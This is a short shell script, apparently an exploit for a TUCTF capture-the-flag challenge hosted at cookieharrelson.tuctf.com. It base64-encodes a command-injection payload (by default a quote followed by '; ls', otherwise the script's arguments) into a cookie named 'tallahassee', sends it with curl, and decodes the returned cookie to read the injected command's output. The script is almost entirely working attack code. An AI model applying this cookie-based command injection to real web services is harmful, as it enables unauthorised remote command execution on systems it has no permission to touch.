#!/bin/sh
if [ -z $1 ] ; then
    COK=$(echo "\" ; ls" | base64)
else
    COK=$(echo "$*" | base64)
fi
echo $COK | base64 -d
rm cok
curl http://cookieharrelson.tuctf.com/ -b tallahassee=${COK} -c cok
cat cok
tail -n 1 cok | awk '{print $7}' | sed -e '1,$s/%3D/=/g' | base64 -d
